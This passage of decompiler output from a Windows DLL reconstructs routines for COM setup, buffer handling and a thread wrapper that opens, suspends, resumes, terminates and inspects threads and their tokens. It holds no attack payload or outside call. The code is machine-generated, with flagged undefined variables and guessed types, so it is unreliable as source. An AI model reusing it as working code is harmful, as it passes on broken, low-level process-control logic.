  v2[3] = v2;
  *this = off_101025E4;
  v2[6] = 0;
  return sub_10011FED((int)this);
}
// 101025E4: using guessed type int (__thiscall *off_101025E4[6])(void *Block, char);

//----- (10011F23) --------------------------------------------------------
char __userpurge sub_10011F23@<al>(int a1@<ecx>, int a2@<edi>, char a3)
{
  void *v3; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v8; // [esp+4h] [ebp-18h] BYREF
  char v9[8]; // [esp+8h] [ebp-14h] BYREF
  int v10; // [esp+18h] [ebp-4h]

  v3 = &loc_100A581D;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(v3) = sub_10011FED(a1);
    if ( !(_BYTE)v3 )
    {
      v5 = sub_1000E9DF(&v8, 1, 1);
      v10 = 0;
      sub_1000A947(v5, 165);
    }
  }
  if ( a3 )
  {
    v6 = sub_1000E950((int)v9);
    v10 = 1;
    sub_10007DD5(v6, 454);
  }
  *(_DWORD *)(a1 + 4) = a2;
  return (char)v3;
}
// 10011F23: using guessed type char var_14[8];

//----- (10011F8F) --------------------------------------------------------
char __usercall sub_10011F8F@<al>(int a1@<esi>)
{
  int v1; // eax
  char result; // al

  v1 = *(_DWORD *)(a1 + 4);
  if ( !v1 || v1 == -1 )
    return 1;
  result = sub_10011B71(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10011FAC) --------------------------------------------------------
bool __usercall sub_10011FAC@<al>(int a1@<esi>)
{
  int v1; // eax
  bool result; // al

  v1 = *(_DWORD *)(a1 + 4);
  if ( !v1 || v1 == -1 )
    return 1;
  result = LocalFree(*(HLOCAL *)(a1 + 4)) == 0;
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10011FCD) --------------------------------------------------------
bool __usercall sub_10011FCD@<al>(int a1@<esi>)
{
  int v1; // eax
  bool result; // al

  v1 = *(_DWORD *)(a1 + 4);
  if ( v1 == -1 || !v1 )
    return 1;
  result = SetupDiDestroyDeviceInfoList(*(HDEVINFO *)(a1 + 4));
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (10011FED) --------------------------------------------------------
bool __usercall sub_10011FED@<al>(int a1@<esi>)
{
  int v1; // eax
  bool result; // al

  v1 = *(_DWORD *)(a1 + 4);
  if ( !v1 || v1 == -1 )
    return 1;
  result = UnmapViewOfFile(*(LPCVOID *)(a1 + 4));
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (1001200D) --------------------------------------------------------
_DWORD *__usercall sub_1001200D@<eax>(_DWORD *a1@<esi>)
{
  int v1; // eax
  _DWORD *v2; // eax
  _DWORD v4[6]; // [esp+0h] [ebp-18h] BYREF

  *a1 = off_101025F0;
  v1 = CoInitializeEx(0, 0);
  if ( v1 < 0 )
  {
    v2 = sub_1000E9A1(v4, v1);
    v4[5] = 0;
    sub_10012178((int)v2, 28);
  }
  sub_100120B4();
  return a1;
}
// 101025F0: using guessed type int (__thiscall *off_101025F0[3])(void *Block, char);

//----- (10012057) --------------------------------------------------------
_DWORD *__thiscall sub_10012057(_DWORD *Block, char a2)
{
  sub_10012076(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012076) --------------------------------------------------------
void __thiscall sub_10012076(_DWORD *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  *this = off_101025F0;
  v1[6] = 0;
  CoUninitialize();
}
// 101025F0: using guessed type int (__thiscall *off_101025F0[3])(void *Block, char);

//----- (100120B4) --------------------------------------------------------
int sub_100120B4()
{
  int result; // eax
  _DWORD *v1; // eax
  _DWORD v2[6]; // [esp+8h] [ebp-18h] BYREF

  result = CoInitializeSecurity(0, -1, 0, 0, 0, 3u, 0, 0x40u, 0);
  if ( result != -2147417831 && result < 0 )
  {
    v1 = sub_1000E9A1(v2, result);
    v2[5] = 0;
    sub_10012178((int)v1, 59);
  }
  return result;
}

//----- (10012103) --------------------------------------------------------
char *__thiscall sub_10012103(char *this)
{
  *(_DWORD *)this = off_101025F4;
  VariantInit((VARIANTARG *)(this + 8));
  return this;
}
// 101025F4: using guessed type int (__thiscall *off_101025F4[2])(void *, char);

//----- (1001211A) --------------------------------------------------------
void __thiscall sub_1001211A(char *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v3; // [esp+0h] [ebp-28h] BYREF
  _DWORD v4[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v4[3] = &v3;
  *(_DWORD *)this = off_101025F4;
  v5 = 0;
  v1 = VariantClear((VARIANTARG *)(this + 8));
  if ( v1 < 0 )
  {
    v2 = sub_1000E9A1(v4, v1);
    LOBYTE(v5) = 1;
    sub_10012178((int)v2, 115);
  }
}
// 101025F4: using guessed type int (__thiscall *off_101025F4[2])(void *, char);

//----- (10012178) --------------------------------------------------------
void __cdecl __noreturn sub_10012178(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1001219A(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVRnaLirybajtn_sr__);
}
// 10012178: using guessed type _DWORD pExceptionObject[2];

//----- (1001219A) --------------------------------------------------------
_DWORD *__thiscall sub_1001219A(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_10102420;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10102420: using guessed type int (__thiscall *off_10102420)(void *Block, char);

//----- (100121DB) --------------------------------------------------------
char *__thiscall sub_100121DB(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x20u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1001211A);
    if ( (a2 & 1) != 0 )
      j_j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1001211A(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (10012225) --------------------------------------------------------
int __thiscall sub_10012225(_DWORD *this, int a2)
{
  *(_BYTE *)(a2 + 4) = 0;
  *(_BYTE *)(a2 + 12) = 0;
  *(_DWORD *)a2 = &off_101025F8;
  *(_DWORD *)(a2 + 8) = &off_10102628;
  sub_1000B36F(this, a2 + 16);
  *(_DWORD *)(a2 + 36) = 0;
  *(_DWORD *)(a2 + 40) = this[3];
  return a2;
}
// 101025F8: using guessed type int (__thiscall *off_101025F8)(void *Block, char);
// 10102628: using guessed type int (__stdcall *off_10102628)(int);

//----- (1001227F) --------------------------------------------------------
void *__thiscall sub_1001227F(void *Block, char a2)
{
  sub_1001229E((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001229E) --------------------------------------------------------
void *__thiscall sub_1001229E(int this)
{
  _BYTE *v2; // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *(_DWORD *)this = &off_101025F8;
  v2 = (_BYTE *)(this + 8);
  *(_DWORD *)v2 = &off_10102628;
  v5 = 3;
  *(_BYTE *)(this + 4) = 1;
  sub_1001B4C9(v2);
  v5 = 1;
  sub_1000B3DF((int *)(this + 16));
  LOBYTE(v5) = 0;
  sub_1001B492(this != 0 ? (_BYTE *)(this + 8) : 0);
  v5 = -1;
  return sub_1001170B((_BYTE *)this);
}
// 101025F8: using guessed type int (__thiscall *off_101025F8)(void *Block, char);
// 10102628: using guessed type int (__stdcall *off_10102628)(int);

//----- (10012326) --------------------------------------------------------
int __thiscall sub_10012326(int *this, _BYTE *a2)
{
  int v3; // ecx

  if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 28))(this) )
    return 0;
  *a2 = *(_BYTE *)sub_1000B4CB((int)(this + 4), v3, this[9]++);
  return 1;
}
// 1001233F: variable 'v3' is possibly undefined

//----- (10012356) --------------------------------------------------------
size_t __thiscall sub_10012356(_DWORD *this, _DWORD *a2)
{
  unsigned int v5; // ebx
  size_t v6; // ebx
  int v7; // ecx
  void *v8; // eax
  const void *v9; // [esp-10h] [ebp-14h]
  char v10; // [esp+Fh] [ebp+Bh]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  v5 = a2[3];
  if ( v5 >= (*(int (__thiscall **)(_DWORD *))(*this + 24))(this) )
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 24))(this);
  else
    v6 = a2[3];
  v10 = *(_BYTE *)(a2[1] + 8);
  v9 = (const void *)(this[9] + sub_1000B4B8(this + 4));
  v8 = (void *)sub_1000B49B(a2, v7);
  memcpy(v8, v9, v6);
  if ( v10 )
    *(_BYTE *)(a2[1] + 8) = 1;
  this[9] += v6;
  return v6;
}
// 100123A2: variable 'v7' is possibly undefined

//----- (100123C9) --------------------------------------------------------
unsigned int __thiscall sub_100123C9(int *this, char a2)
{
  unsigned int v3; // eax
  unsigned int result; // eax

  v3 = this[7];
  if ( v3 >= this[8] )
    sub_10012502(this - 2, (void *)(v3 + 1));
  *(_BYTE *)sub_1000B4CB((int)(this + 2), (int)this, this[7]) = a2;
  result = ++this[7];
  if ( result > this[8] )
    this[8] = result;
  return result;
}
// 100123E7: variable 'this' is possibly undefined

//----- (10012404) --------------------------------------------------------
int __thiscall sub_10012404(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edi
  int v4; // ecx
  int v5; // eax
  int result; // eax
  bool v7; // cc
  const void *v8; // [esp-8h] [ebp-14h]
  size_t v9; // [esp-4h] [ebp-10h]

  v3 = this[7] + a2[3];
  if ( v3 > this[8] )
    sub_10012502(this - 2, (void *)(this[7] + a2[3]));
  v9 = a2[3];
  v8 = (const void *)sub_1000B4B8(a2);
  v5 = sub_1000B49B(this + 2, v4);
  memcpy((void *)(this[7] + v5), v8, v9);
  result = this[3];
  *(_BYTE *)(result + 8) = 1;
  v7 = v3 <= this[8];
  this[7] = v3;
  if ( !v7 )
    this[8] = v3;
  return result;
}
// 10012431: variable 'v4' is possibly undefined

//----- (1001245B) --------------------------------------------------------
int __thiscall sub_1001245B(_DWORD *this, int a2)
{
  sub_1000B67C(this + 4, a2, 0, this[10]);
  return a2;
}

//----- (10012498) --------------------------------------------------------
int __thiscall sub_10012498(_DWORD *this)
{
  return this[10] - this[9];
}

//----- (1001249F) --------------------------------------------------------
int __thiscall sub_1001249F(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // eax
  char v6[8]; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-4h]

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[9];
    }
    else if ( a3 == 2 )
    {
      v3 = this[10];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[10] )
  {
    v5 = sub_1000E88D((int)v6, 1, 0);
    v7 = 0;
    sub_10012582(v5, 131);
  }
  this[9] = result;
  return result;
}
// 1001249F: using guessed type char var_14[8];

//----- (10012502) --------------------------------------------------------
void __thiscall sub_10012502(_DWORD *this, void *a2)
{
  unsigned int v3; // eax
  LONG *v4; // eax
  unsigned int i; // ebx
  _DWORD *v6; // eax
  int v7[5]; // [esp+Ch] [ebp-20h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  v3 = this[7];
  if ( !v3 )
  {
    v4 = (LONG *)sub_1000B1F3(a2, (int)v7, 0);
    v8 = 0;
    sub_1000B3BD(v4, (int)(this + 4));
LABEL_8:
    v8 = -1;
    sub_1000B3DF(v7);
    return;
  }
  for ( i = this[7]; (unsigned int)a2 > i; i *= 2 )
    ;
  if ( i > v3 )
  {
    v6 = (_DWORD *)sub_1000B1F3((void *)(i - v3), (int)v7, 0);
    v8 = 1;
    sub_1000B544(v6, (int)(this + 4));
    goto LABEL_8;
  }
}
// 10012502: using guessed type int var_20[5];

//----- (10012582) --------------------------------------------------------
void __cdecl __noreturn sub_10012582(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000CADA(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
}
// 10012582: using guessed type _DWORD pExceptionObject[2];

//----- (100125A6) --------------------------------------------------------
char sub_100125A6()
{
  return sub_10051B21();
}

//----- (100125AE) --------------------------------------------------------
int __thiscall sub_100125AE(_DWORD *this, int a2, int a3)
{
  return sub_1001249F(this - 2, a2, a3);
}

//----- (100125B6) --------------------------------------------------------
void *__thiscall sub_100125B6(char *this, char a2)
{
  return sub_1001227F(this - 8, a2);
}

//----- (100125BE) --------------------------------------------------------
int __thiscall sub_100125BE(_DWORD *this)
{
  return sub_1000BE87(this - 2);
}

//----- (100125C6) --------------------------------------------------------
_DWORD *__stdcall sub_100125C6(_DWORD *a1, void *a2, char a3)
{
  sub_10012E21(a1, a2, a3);
  a1[2] = -1;
  return a1;
}

//----- (100125FD) --------------------------------------------------------
void __stdcall sub_100125FD(int *a1)
{
  sub_10012E7E(a1);
}

//----- (10012621) --------------------------------------------------------
_DWORD *__stdcall sub_10012621(_DWORD *a1, void *a2, char a3)
{
  sub_100125C6(a1, a2, a3);
  *a1 = &off_1010265C;
  return a1;
}
// 1010265C: using guessed type int (__thiscall *off_1010265C)(void *Block, char);

//----- (1001265A) --------------------------------------------------------
int *__thiscall sub_1001265A(int *Block, char a2)
{
  sub_10012679(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012679) --------------------------------------------------------
void __thiscall sub_10012679(int *this)
{
  *this = (int)&off_1010265C;
  sub_100125FD(this);
}
// 1010265C: using guessed type int (__thiscall *off_1010265C)(void *Block, char);

//----- (100126A3) --------------------------------------------------------
DWORD __thiscall sub_100126A3(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v4[3]; // [esp+0h] [ebp-1Ch] BYREF
  DWORD ExitCode[4]; // [esp+Ch] [ebp-10h] BYREF

  v1 = this[1];
  ExitCode[0] = 0;
  if ( !GetExitCodeThread(*(HANDLE *)(v1 + 16), ExitCode) )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    ExitCode[3] = 0;
    sub_1000A947(v2, 46);
  }
  return ExitCode[0];
}
// 100126A3: using guessed type int var_1C[3];

//----- (100126F0) --------------------------------------------------------
char __thiscall sub_100126F0(_DWORD *this, DWORD dwExitCode)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD v6[6]; // [esp+4h] [ebp-18h] BYREF

  LOBYTE(v3) = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( (_BYTE)v3 )
  {
    LOBYTE(v3) = sub_1001303A((int)this);
    if ( !(_BYTE)v3 )
    {
      v3 = TerminateThread(*(HANDLE *)(this[1] + 16), dwExitCode);
      if ( !v3 )
      {
        v4 = sub_1000E9DF(v6, 1, 1);
        v6[5] = 0;
        sub_1000A947(v4, 53);
      }
    }
  }
  return v3;
}

//----- (1001274E) --------------------------------------------------------
int __stdcall sub_1001274E(int a1, void *a2)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int result; // eax
  int v5; // eax
  _DWORD v6[3]; // [esp-8h] [ebp-28h] BYREF
  int v7[4]; // [esp+4h] [ebp-1Ch] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  if ( (dword_10193B1C & 1) == 0 )
  {
    dword_10193B1C |= 1u;
    v8 = 0;
    sub_1000D17D(v7, aNtdllDll);
    LOBYTE(v8) = 1;
    v2 = (wchar_t *)sub_1000CC40((int)&unk_1017A0B0);
    v6[0] = v3;
    v7[2] = (int)v6;
    sub_1000D17D(v6, v2);
    LOBYTE(v8) = 1;
    dword_1018329C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1001E665((int)v7);
    LOBYTE(v8) = 0;
    sub_1000D3AD(v7);
    v8 = -1;
  }
  memset(a2, 0, 0x1Cu);
  result = dword_1018329C(*(_DWORD *)(*(_DWORD *)(a1 + 4) + 16), 0, a2, 28, 0);
  if ( result < 0 )
  {
    v5 = sub_1000E7F7(1, 0);
    v8 = 3;
    v6[1] = 69;
    sub_10007882(v5);
  }
  return result;
}
// 1001278D: variable 'v3' is possibly undefined
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 1018329C: using guessed type int (__stdcall *dword_1018329C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10193B1C: using guessed type int dword_10193B1C;

//----- (10012814) --------------------------------------------------------
int __thiscall sub_10012814(_DWORD *this)
{
  char v2[12]; // [esp+0h] [ebp-1Ch] BYREF
  int v3; // [esp+Ch] [ebp-10h]

  if ( !*(_DWORD *)(this[1] + 16) )
    return -1;
  sub_1001274E((int)this, v2);
  return v3;
}
// 10012814: using guessed type char var_1C[12];

//----- (10012837) --------------------------------------------------------
bool __thiscall sub_10012837(_DWORD *this)
{
  DWORD v1; // eax
  _DWORD *v2; // eax
  _DWORD v4[6]; // [esp+0h] [ebp-18h] BYREF

  v1 = ResumeThread(*(HANDLE *)(this[1] + 16));
  if ( v1 == -1 )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    v4[5] = 0;
    sub_1000A947(v2, 87);
  }
  return v1 <= 1;
}

//----- (10012882) --------------------------------------------------------
_DWORD *__thiscall sub_10012882(void *this, _DWORD *a2, DWORD a3)
{
  char v4[8]; // [esp+4h] [ebp-2Ch] BYREF
  DWORD v5; // [esp+Ch] [ebp-24h]
  int v6; // [esp+20h] [ebp-10h]

  v6 = 0;
  sub_1001274E((int)this, v4);
  sub_1001CA35(v5, a2, a3);
  return a2;
}
// 10012882: using guessed type char var_2C[8];

//----- (100128CB) --------------------------------------------------------
void __stdcall sub_100128CB(int *a1)
{
  sub_100125FD(a1);
}

//----- (100128EF) --------------------------------------------------------
__int64 __thiscall sub_100128EF(_DWORD *this)
{
  _DWORD *v1; // eax
  int v3[3]; // [esp+0h] [ebp-38h] BYREF
  struct _FILETIME CreationTime; // [esp+Ch] [ebp-2Ch] BYREF
  struct _FILETIME ExitTime; // [esp+14h] [ebp-24h] BYREF
  struct _FILETIME UserTime; // [esp+1Ch] [ebp-1Ch] BYREF
  struct _FILETIME KernelTime; // [esp+24h] [ebp-14h] BYREF
  int v8; // [esp+34h] [ebp-4h]

  if ( !GetThreadTimes(*(HANDLE *)(this[1] + 16), &CreationTime, &ExitTime, &KernelTime, &UserTime) )
  {
    v1 = sub_1000E9DF(v3, 1, 1);
    v8 = 0;
    sub_1000A947(v1, 112);
  }
  return *(__int64 *)&UserTime / 10000 + *(__int64 *)&KernelTime / 10000;
}
// 100128EF: using guessed type int var_38[3];

//----- (10012974) --------------------------------------------------------
DWORD __thiscall sub_10012974(_DWORD *this)
{
  DWORD result; // eax
  _DWORD *v2; // eax
  _DWORD v3[6]; // [esp+0h] [ebp-18h] BYREF

  result = SuspendThread(*(HANDLE *)(this[1] + 16));
  if ( result == -1 )
  {
    v2 = sub_1000E9DF(v3, 1, 1);
    v3[5] = 0;
    sub_1000A947(v2, 119);
  }
  return result;
}

//----- (100129B6) --------------------------------------------------------
_DWORD *__usercall sub_100129B6@<eax>(DWORD a1@<ebx>, _DWORD *a2)
{
  HANDLE v2; // eax
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v6; // [esp+20h] [ebp-4h]

  v6 = 0;
  v5[3] = 0;
  v2 = OpenThread(0x1F03FFu, 0, a1);
  if ( !v2 )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    v6 = 1;
    sub_1000A947(v3, 124);
  }
  sub_10012621(a2, v2, 0);
  a2[2] = a1;
  return a2;
}

//----- (10012A1E) --------------------------------------------------------
_DWORD *__userpurge sub_10012A1E@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10012A51(a1, a2);
  *a2 = &off_1010265C;
  return a2;
}
// 1010265C: using guessed type int (__thiscall *off_1010265C)(void *Block, char);

//----- (10012A51) --------------------------------------------------------
_DWORD *__userpurge sub_10012A51@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10012A85(a2, a1);
  a2[2] = *(_DWORD *)(a1 + 8);
  return a2;
}

//----- (10012A85) --------------------------------------------------------
_DWORD *__stdcall sub_10012A85(_DWORD *a1, int a2)
{
  *a1 = &off_1010264C;
  a1[1] = *(_DWORD *)(a2 + 4);
  sub_10012CDF(a1 + 1);
  return a1;
}
// 1010264C: using guessed type int (__thiscall *off_1010264C)(void *Block, char);

//----- (10012AC0) --------------------------------------------------------
int *__thiscall sub_10012AC0(int *Block, char a2)
{
  sub_10012E7E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012ADF) --------------------------------------------------------
_DWORD *__thiscall sub_10012ADF(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess)
{
  int v4; // eax
  _DWORD *v5; // eax
  HANDLE v7[4]; // [esp+0h] [ebp-20h] BYREF
  HANDLE TokenHandle[4]; // [esp+10h] [ebp-10h] BYREF

  v7[3] = 0;
  v4 = this[1];
  TokenHandle[0] = 0;
  if ( !OpenThreadToken(*(HANDLE *)(v4 + 16), DesiredAccess, a3 != 0, TokenHandle) )
  {
    v5 = sub_1000E9DF(v7, 1, 1);
    TokenHandle[3] = HANDLE_FLAG_INHERIT;
    sub_1000A947(v5, 134);
  }
  sub_1001B526(a2, TokenHandle[0]);
  return a2;
}

//----- (10012B5A) --------------------------------------------------------
LPCONTEXT __thiscall sub_10012B5A(_DWORD *this, LPCONTEXT lpContext)
{
  _DWORD *v3; // eax
  LPCONTEXT v4; // esi
  _DWORD *v5; // eax
  int v7[3]; // [esp+8h] [ebp-18h] BYREF
  int v8; // [esp+1Ch] [ebp-4h]

  if ( this[2] == GetCurrentThreadId() )
  {
    v3 = sub_1000E7F7(&lpContext, 1, 0);
    v8 = 0;
    sub_10007882((int)v3);
  }
  v4 = lpContext;
  lpContext->ContextFlags = 0;
  memset(&v4->Dr0, 0, 0x2C8u);
  if ( !GetThreadContext(*(HANDLE *)(this[1] + 16), v4) )
  {
    v5 = sub_1000E9DF(v7, 1, 1);
    v8 = 1;
    sub_1000A947(v5, 142);
  }
  return v4;
}
// 10012B5A: using guessed type int var_18[3];

//----- (10012BE9) --------------------------------------------------------
int __thiscall sub_10012BE9(_DWORD *this)
{
  int v2; // eax
  char v4[716]; // [esp+4h] [ebp-2DCh] BYREF
  int v5; // [esp+2DCh] [ebp-4h]

  if ( this[2] == GetCurrentThreadId() )
  {
    v2 = sub_1000E7F7(1, 0);
    v5 = 0;
    sub_10007882(v2);
  }
  return *(_DWORD *)((*(int (__thiscall **)(_DWORD *, char *))(*this + 48))(this, v4) + 180);
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 10012BE9: using guessed type char var_2DC[716];

//----- (10012C43) --------------------------------------------------------
int __thiscall sub_10012C43(_DWORD *this)
{
  int v2; // eax
  char v4[716]; // [esp+4h] [ebp-2DCh] BYREF
  int v5; // [esp+2DCh] [ebp-4h]

  if ( this[2] == GetCurrentThreadId() )
  {
    v2 = sub_1000E7F7(1, 0);
    v5 = 0;
    sub_10007882(v2);
  }
  return *(_DWORD *)((*(int (__thiscall **)(_DWORD *, char *))(*this + 48))(this, v4) + 184);
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 10012C43: using guessed type char var_2DC[716];

//----- (10012C9D) --------------------------------------------------------
LONG __stdcall sub_10012C9D(int *a1)
{
  LONG result; // eax
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  result = (LONG)a1;
  if ( *a1 )
    return sub_1000B119(*a1);
  return result;
}

//----- (10012CDF) --------------------------------------------------------
LONG __usercall sub_10012CDF@<eax>(int *a1@<esi>)
{
  LONG result; // eax
  void *v2; // eax
  int v3; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) )
    {
      v2 = operator new(0x14u);
      if ( v2 )
        v3 = sub_10012DA1((int)v2, *a1);
      else
        v3 = 0;
      *a1 = v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}

//----- (10012D33) --------------------------------------------------------
int __stdcall sub_10012D33(int a1, void *a2, char a3)
{
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-18h]

  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10102698;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10011AF4(a1 + 12, a2, a3, 0, v3, CurrentProcessId);
  return a1;
}
// 10102698: using guessed type int (__thiscall *off_10102698)(void *Block, char);

//----- (10012D82) --------------------------------------------------------
_DWORD *__thiscall sub_10012D82(_DWORD *Block, char a2)
{
  sub_10012DF5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012DA1) --------------------------------------------------------
int __stdcall sub_10012DA1(int a1, int a2)
{
  void *v2; // ebx
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-1Ch]

  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 8) = 1;
  *(_DWORD *)a1 = &off_10102698;
  v2 = *(void **)(a2 + 16);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10011AF4(a1 + 12, v2, 0, 0, v3, CurrentProcessId);
  return a1;
}
// 10102698: using guessed type int (__thiscall *off_10102698)(void *Block, char);

//----- (10012DF5) --------------------------------------------------------
bool __thiscall sub_10012DF5(_DWORD *this)
{
  *this = &off_10102698;
  return sub_1000A159(this + 3);
}
// 10102698: using guessed type int (__thiscall *off_10102698)(void *Block, char);

//----- (10012E21) --------------------------------------------------------
_DWORD *__stdcall sub_10012E21(_DWORD *a1, void *a2, char a3)
{
  void *v3; // eax
  int v4; // eax

  *a1 = &off_1010264C;
  v3 = operator new(0x14u);
  if ( v3 )
    v4 = sub_10012D33((int)v3, a2, a3);
  else
    v4 = 0;
  a1[1] = v4;
  sub_10012CDF(a1 + 1);
  return a1;
}
// 1010264C: using guessed type int (__thiscall *off_1010264C)(void *Block, char);

//----- (10012E7E) --------------------------------------------------------
void __thiscall sub_10012E7E(int *this)
{
  *this = (int)&off_1010264C;
  sub_10012C9D(this + 1);
}
// 1010264C: using guessed type int (__thiscall *off_1010264C)(void *Block, char);

//----- (10012EAB) --------------------------------------------------------
void __stdcall sub_10012EAB(int a1, int a2, char pExceptionObject)
{
  _DWORD v3[197]; // [esp+4h] [ebp-328h] BYREF
  int v4[2]; // [esp+318h] [ebp-14h] BYREF
  int v5; // [esp+328h] [ebp-4h]

  sub_1001E85D(v3);
  v5 = 0;
  sub_1001E967((int)v3, a1);
  sub_1001EB8D(v3, v4, a2, pExceptionObject);
  LOBYTE(v5) = 0;
  sub_10012E7E(v4);
  v5 = -1;
  sub_1001E8ED(v3);
}
// 10012EAB: using guessed type _DWORD var_328[197];

//----- (10012F17) --------------------------------------------------------
BOOL __thiscall sub_10012F17(_DWORD *this)
{
  return sub_1000AA9A(this[1] + 12);
}

//----- (10012F22) --------------------------------------------------------
void __thiscall sub_10012F22(int *this, void *a2, int a3)
{
  int *v3; // edi
  int v4; // esi
  void *v5; // eax
  int v6; // eax
  DWORD v7; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-1Ch]

  v3 = this + 1;
  v4 = this[1];
  if ( *(_DWORD *)(v4 + 4) <= 1u )
  {
    CurrentProcessId = GetCurrentProcessId();
    v7 = GetCurrentProcessId();
    sub_1000A198((HANDLE *)(v4 + 12), a2, a3, 0, v7, CurrentProcessId);
  }
  else
  {
    v5 = operator new(0x14u);
    if ( v5 )
      v6 = sub_10012D33((int)v5, a2, a3);
    else
      v6 = 0;
    a3 = v6;
    sub_10012CDF(&a3);
    sub_100130E8(&a3, v3);
    sub_10012C9D(&a3);
  }
}

//----- (10012FB6) --------------------------------------------------------
int __thiscall sub_10012FB6(int *this)
{
  int *v1; // edi
  int v2; // eax
  void *v3; // eax
  void *v4; // eax
  int v6; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v8; // [esp+14h] [ebp-4h]

  v1 = this + 1;
  v2 = this[1];
  v6 = *(_DWORD *)(v2 + 16);
  if ( *(_DWORD *)(v2 + 4) <= 1u )
  {
    *(_DWORD *)(*v1 + 16) = -1;
  }
  else
  {
    v3 = operator new(0x14u);
    Block = v3;
    v8 = 0;
    if ( v3 )
      v4 = (void *)sub_10012D33((int)v3, (void *)0xFFFFFFFF, 0);
    else
      v4 = 0;
    v8 = -1;
    Block = v4;
    sub_10012CDF((int *)&Block);
    v8 = 1;
    sub_100130E8((int *)&Block, v1);
    v8 = -1;
    sub_10012C9D((int *)&Block);
  }
  return v6;
}

//----- (1001303A) --------------------------------------------------------
bool __stdcall sub_1001303A(int a1)
{
  bool v2; // [esp+Fh] [ebp-329h]
  int v3[2]; // [esp+10h] [ebp-328h] BYREF
  _DWORD v4[197]; // [esp+18h] [ebp-320h] BYREF
  int v5; // [esp+334h] [ebp-4h]

  sub_1001E85D(v4);
  v5 = 0;
  sub_1001E967((int)v4, a1);
  sub_1001EA28((int)v4, v3, 0, (int (__thiscall **)(void *, char))1, 0);
  LOBYTE(v5) = 1;
  v2 = *(_DWORD *)(v3[1] + 16) != -1;
  LOBYTE(v5) = 0;
  sub_10012E7E(v3);
  v5 = -1;
  sub_1001E8ED(v4);
  return v2;
}
// 1001303A: using guessed type _DWORD var_320[197];

//----- (100130E8) --------------------------------------------------------
